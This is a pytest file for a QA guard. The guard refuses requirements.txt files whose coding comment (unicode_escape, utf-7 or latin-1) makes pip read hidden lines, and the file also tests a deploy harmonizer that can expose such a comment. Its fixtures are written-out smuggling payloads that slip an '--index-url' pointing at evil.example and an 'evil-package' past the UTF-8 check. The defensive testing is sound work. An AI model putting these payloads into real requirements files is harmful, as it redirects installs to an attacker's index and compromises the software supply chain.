"""QA-CHECK-REQUIREMENTS-ENCODING (register row; QA runner job only): `check_requirements` reads requirements.txt as UTF-8, but
pip decodes the file with the codec a `#` comment in its first two lines names. The file is refused when, and only when,
real pip would read something else than the text QA checked, on the file as committed and as the deploy's harmonizer
writes it back. Real check_requirements, real pip reader (local bytes, nothing installed), real harmonizer.
"""
import hermetic_guard  # noqa: F401,E402  (must stay the first import: tests/hermetic_guard.py)

import base64

import pytest

import fd4f_support  # noqa: F401  (puts the gateway on sys.path)
import qa_sandbox_support as sup

from developer_agent import qa_requirements_guard as G  # noqa: E402

sj = sup.load_sandbox_job("sandbox_job_qa_check_req_encoding")

EVIL = "--index-url https://evil.example/simple"
BASE = "fastapi>=0.110.0\nuvicorn>=0.28.0\n"
_UTF7 = base64.b64encode(f"\n{EVIL}\nevil-package".encode("utf-16-be")).decode().rstrip("=")
ESCAPE_PAYLOAD = "# -*- coding: unicode_escape -*-\n" + BASE + "requests\n# \\n" + EVIL + "\\nevil-package==1.0\\n"
UTF7_PAYLOAD = "# coding: utf-7\n" + BASE + f"requests==2.31.0+{_UTF7}\n"
LATIN_PAYLOAD = "# coding: latin-1\nrequests\n# \u0105" + EVIL + "\n"             # U+0105 is C4 85: pip sees a NEL line break
HIDDEN_PAYLOAD = "requests\x0c# coding: unicode_escape\n# \\n" + EVIL + "\\n"     # the cookie is not on a pip line 1 or 2 yet


def _pip_lines(data):
    """The lines real pip's requirements-file reader gets from these bytes."""
    from pip._internal.req.req_file import _decode_req_file, preprocess
    return [line for _n, line in preprocess(_decode_req_file(data, "requirements.txt"))]


def _check(tmp_path, data):
    (tmp_path / "apps" / "svc").mkdir(parents=True)
    (tmp_path / "apps" / "svc" / "requirements.txt").write_bytes(data)
    svc = sj.Service("svc", "apps/svc", [])
    return sj.check_requirements(str(tmp_path), [svc]), svc


def test_the_rule_is_the_one_the_installed_pip_applies():
    from pip._internal.req import req_file
    assert req_file.PEP263_ENCODING_RE.pattern == sj.PIP_PEP263_ENCODING_RE.pattern
    assert req_file.BOMS[0] == (b"\xef\xbb\xbf", "utf-8")


@pytest.mark.parametrize("text", [ESCAPE_PAYLOAD, UTF7_PAYLOAD, LATIN_PAYLOAD], ids=["unicode_escape", "utf7", "latin1"])
def test_a_file_pip_would_read_differently_is_refused(tmp_path, text):
    assert any(EVIL in line for line in _pip_lines(text.encode("utf-8")))     # real pip: the attacker's line is there
    assert not any(line.strip().startswith(EVIL) for line in text.splitlines())   # this job's reading before the fix
    diags, svc = _check(tmp_path, text.encode("utf-8"))
    assert [(d["code"], d["file"]) for d in diags] == [("POLICY.REQUIREMENTS_LINE", "apps/svc/requirements.txt")]
    assert svc.requirements == []


@pytest.mark.parametrize("comment", ["# coding: nonsense-codec", "# Encoding: see the README", "# coding=base64"])
def test_a_codec_pip_cannot_use_is_refused_as_pip_fails_on_it(tmp_path, comment):
    data = (comment + "\n" + BASE).encode("utf-8")
    with pytest.raises(LookupError):
        _pip_lines(data)
    assert [d["code"] for d in _check(tmp_path, data)[0]] == ["POLICY.REQUIREMENTS_LINE"]


@pytest.mark.parametrize("cookie", ["# -*- coding: utf-8 -*-", "# coding=UTF8", "# vim: set fileencoding=utf-8 :",
                                    "# coding: ascii", "# coding: latin-1"])
def test_a_harmless_declaration_is_unaffected(tmp_path, cookie):
    """The file's own Python-style utf-8 comment makes no difference to pip: same lines, so nothing changes here."""
    text = cookie + "\n" + BASE + "requests==2.31.0\n"
    data = text.encode("utf-8")
    assert _pip_lines(data) == _pip_lines(text.split("\n", 1)[1].encode("utf-8"))    # real pip reads exactly these lines
    diags, svc = _check(tmp_path, data)
    assert diags == [] and svc.requirements == ["fastapi>=0.110.0", "uvicorn>=0.28.0", "requests==2.31.0"]


@pytest.mark.parametrize("text", [
    "", BASE, "\ufeff" + BASE, "\ufeff# -*- coding: unicode_escape -*-\n" + BASE,
    BASE + "# coding: utf-7\n",                                             # the third line: pip never looks there
    "fastapi>=0.110.0  # coding: utf-7\nuvicorn\n",
    " # coding: utf-7\n" + BASE,
    "# requirements for the service\n" + BASE, "fastapi\r\nuvicorn\r\n",
], ids=["empty", "plain", "bom", "bom_wins_over_a_cookie", "third_line", "trailing", "indented", "comment", "crlf"])
def test_a_valid_file_is_unaffected(tmp_path, text):
    """Invariant 1: each of these reads the same to pip as to this job, so check_requirements is unchanged."""
    data = text.encode("utf-8")
    assert sj.pip_reads_other_text(data) is False
    lines = [ln.strip() for ln in _pip_lines(data) if ln.strip() and not ln.strip().startswith("#")]
    diags, svc = _check(tmp_path, data)
    assert diags == [] and len(svc.requirements) == len(lines)


@pytest.mark.parametrize("text", [
    "", BASE, "\ufeff" + BASE, "\ufeff# -*- coding: unicode_escape -*-\n" + BASE, ESCAPE_PAYLOAD, UTF7_PAYLOAD, LATIN_PAYLOAD,
    HIDDEN_PAYLOAD, BASE + "# coding: utf-7\n", " # coding: utf-7\n" + BASE, "fastapi  # coding: utf-7\nuvicorn\n",
    "# -*- coding: utf-8 -*-\n" + BASE, "# coding=UTF8\n" + BASE, "# vim: set fileencoding=utf-8 :\n" + BASE,
    "# coding: ascii\n" + BASE, "# coding: latin-1\n" + BASE, "# coding: utf-7\n" + BASE, "# coding: nonsense-codec\n" + BASE,
    "# coding=base64\n" + BASE, "# coding: latin-1\n# \u0105\n", "# coding: utf-8\n# coding: utf-7\n" + BASE,
    "# coding: utf-7\n# coding: utf-8\n# +AAo-\n", "x\x0c# coding: utf-8\n# coding: unicode_escape\n# \\n\n",
])
def test_the_gateway_guard_applies_the_qa_jobs_rule_to_what_a_file_already_declares(text):
    """A file compared with itself: everything it declares is carried, so only `pip_reads_other_text` is left to refuse it."""
    refused = G._encoding_refusal("r.txt", text, text) is not None
    assert refused is sj.pip_reads_other_text(text.encode("utf-8"))
    assert G.PIP_PEP263_ENCODING_RE.pattern == sj.PIP_PEP263_ENCODING_RE.pattern


def test_the_guard_alone_refuses_a_byte_order_mark_inside_the_file():
    text = BASE + "# \ufeff\n"
    assert sj.pip_reads_other_text(text.encode("utf-8")) is False
    assert G._encoding_refusal("r.txt", text, text).reason == G.ENCODING_DECLARATION


def test_invalid_utf8_keeps_todays_refusal(tmp_path):
    diags, _svc = _check(tmp_path, b"# coding: latin-1\nfastapi\xff\n")
    assert [d["code"] for d in diags] == ["POLICY.REQUIREMENTS_LINE"] and diags[0]["message"] == "requirements.txt is not UTF-8"


# ------------------------------------------------------------------------------------------------ the deployed image
@pytest.fixture
def harmonize(monkeypatch):
    from fd4g_support import load_tf_service
    return load_tf_service(monkeypatch).sanitize_wheel_requirements


@pytest.mark.parametrize("text", [ESCAPE_PAYLOAD, UTF7_PAYLOAD], ids=["unicode_escape", "utf7"])
def test_the_deploy_keeps_the_comment_so_pip_would_still_read_the_attackers_lines(harmonize, text):
    """Why the deployed image is covered by this check: the harmonizer keeps comment lines, so what QA refuses is what the
    Buildpacks `pip install -r` would have read."""
    out = harmonize(text, package_versions={})
    assert out.split("\n", 1)[0] == text.split("\n", 1)[0] and any(EVIL in line for line in _pip_lines(out.encode("utf-8")))


def test_a_comment_the_deploy_moves_up_to_line_two_is_refused_too(harmonize, tmp_path):
    """On the committed bytes pip sees no declaration (it splits on the newline byte); the harmonizer rejoins `splitlines()`."""
    data = HIDDEN_PAYLOAD.encode("utf-8")
    assert not any(EVIL == line.strip() for line in _pip_lines(data))
    out = harmonize(HIDDEN_PAYLOAD, package_versions={})
    assert any(EVIL == line.strip() for line in _pip_lines(out.encode("utf-8")))
    assert [d["code"] for d in _check(tmp_path, data)[0]] == ["POLICY.REQUIREMENTS_LINE"]


def test_the_deploy_leaves_a_utf8_declaration_harmless(harmonize):
    text = "# -*- coding: utf-8 -*-\n" + BASE
    out = harmonize(text, package_versions={}).encode("utf-8")
    assert sj.pip_reads_other_text(out) is False and not any(EVIL in line for line in _pip_lines(out))
